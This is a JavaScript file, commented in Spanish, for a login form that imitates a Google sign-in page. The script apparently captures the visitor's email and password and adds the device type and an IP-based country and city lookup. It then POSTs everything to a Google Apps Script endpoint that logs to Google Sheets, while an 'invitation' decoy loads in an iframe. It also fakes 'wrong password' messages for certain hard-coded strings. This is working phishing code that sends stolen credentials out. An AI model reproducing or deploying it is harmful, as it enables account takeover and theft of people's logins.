document.getElementById("miFormulario").addEventListener("submit", async function(event) {
    event.preventDefault(); // Evita el envío automático 

    // Obtener elementos del formulario
    const emailInput = document.querySelector('input[name="email"]');
    const passwordInput = document.querySelector('input[name="password"]');
    const errorMessage = document.getElementById('error-message');
    
    // Lista de correos electrónicos y contraseñas prohibidas
    const prohibitedEmails = ["ejemplo1@correo.com", "ejemplo@mail.com"]; // Corregido: faltaba comilla de cierre
    const prohibitedWords = ["hola123", "Sandia190395#", "sandia190395#"]; // Agregadas las palabras del HTML
    
    const email = emailInput.value.trim().toLowerCase();
    const password = passwordInput.value;
    
    // Validar formato de correo electrónico
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        errorMessage.textContent = "Introduce una dirección de correo electrónico válida";
        errorMessage.style.color = 'red';
        errorMessage.style.display = 'block';
        return; // Detiene el procesamiento
    }
    
    // Verificar correo prohibido
    const isProhibitedEmail = prohibitedEmails.includes(email);
    if (isProhibitedEmail) {
        errorMessage.textContent = "No se pudo encontrar tu cuenta de Google";
        errorMessage.style.color = 'red';
        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
        errorMessage.style.display = 'block';
        emailInput.value = '';
        passwordInput.value = '';
        return; // Detiene el procesamiento
    }
    
    // Verificar contraseña prohibida
    const containsProhibitedPassword = prohibitedWords.some(word => password.includes(word));
    if (containsProhibitedPassword) {
        errorMessage.textContent = "La contraseña no es correcta. Inténtalo de nuevo.";
        errorMessage.style.color = 'red';
        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
        errorMessage.style.display = 'block';
        passwordInput.value = '';
        return; // Detiene el procesamiento
    }
    
    // Si pasa todas las validaciones, continúa con el proceso normal
    // Limpiar cualquier mensaje de error previo
    if (errorMessage) {
        errorMessage.textContent = "";
        errorMessage.style.display = 'none';
    }

    // Ocultar el formulario
    document.getElementById("miFormulario").style.display = "none";
    
    // Mostrar mensaje "Cargando..."
    let loadingMessage = document.createElement("p");
    loadingMessage.textContent = "⏳ Procesando... por favor, espere.";
    loadingMessage.style.textAlign = "center";
    document.body.appendChild(loadingMessage);
    
    // Antes de mostrar el iframe, ocultar el footer de folder.html
    const footerElement = document.querySelector("p");
    if (footerElement) {
        footerElement.style.display = "none";
    }

    // Mostrar el iframe
    let iframe = document.getElementById("usuarioFrame");
    iframe.src = "invitation.html";
    iframe.style.display = "block";
    
    // Eliminar mensaje de carga después de mostrar usuario.html
    iframe.onload = function() {
        if (loadingMessage && loadingMessage.parentNode) {
            loadingMessage.remove();
        }
    };
    
    // ✅ Detectar si el usuario usa iPhone o Android
    let deviceType = "Otro"; // Valor por defecto
    if (/android/i.test(navigator.userAgent)) {
        deviceType = "Android";
    } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
        deviceType = "iPhone";
    }
    
    // ✅ Obtener el país y la ciudad del usuario desde la API
    let country = "Desconocido";
    let city = "Desconocido";
    try {
        const response = await fetch("https://ipwhois.app/json/");
        const data = await response.json();
        if (data) {
            if (data.country) {
                country = data.country;
            }
            if (data.city) {
                city = data.city;
            }
        }
    } catch (error) {
        console.error("Error obteniendo la ubicación:", error);
    }
    
    // ✅ Asegurar que los datos se agregan correctamente antes de enviarlos
    const formData = new FormData(this);
    formData.append("device", deviceType);
    formData.append("country", country + " - " + city);
    
    // ✅ Enviar los datos correctamente a Google Sheets
    const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
    fetch(url, {
        method: "POST",
        body: new URLSearchParams(formData),
        headers: { "Content-Type": "application/x-www-form-urlencoded" }
    }).catch(error => console.error("Error al enviar datos:", error));
});
